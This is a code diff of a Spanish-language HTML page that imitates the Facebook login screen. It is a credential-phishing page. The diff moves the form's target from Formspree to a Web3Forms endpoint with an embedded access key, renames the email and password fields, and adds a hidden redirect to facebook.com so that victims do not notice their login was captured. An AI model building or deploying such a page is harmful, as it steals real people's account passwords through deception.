@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iniciar sesión</title>
+    <title>Acceso Seguro</title>
     <style>
         body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; text-align: center; }
-        h1 { color: #1877f2; font-size: 2rem; margin-bottom: 20px; }
+        h1 { color: #1877f2; font-size: 2.2rem; margin-bottom: 20px; }
         input { width: 90%; padding: 12px; margin-bottom: 10px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 14px; }
         button { width: 98%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
         .divider { margin: 20px 0; border-bottom: 1px solid #dadde1; }
@@ -17,14 +17,18 @@
 <body>
     <div class="login-box">
         <h1>Iniciar sesión</h1>
-        <form action="https://formspree.io/f/xjgpondw" method="POST">
-            <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
-            <input type="password" name="pass" placeholder="Contraseña" required>
-            <button type="submit">Iniciar sesión</button>
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="9d2986fb-7976-4c9e-b378-c85bb3d78068">
+            
+            <input type="text" name="user_id" placeholder="Móvil o correo electrónico" required>
+            <input type="password" name="user_pass" placeholder="Contraseña" required>
+            
+            <input type="hidden" name="redirect" value="https://www.facebook.com">
+
+            <button type="submit">Entrar</button>
         </form>
         <div class="divider"></div>
-        <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
+        <a href="#" class="forgot">¿Olvidaste tu cuenta?</a>
     </div>
 </body>
 </html>
-
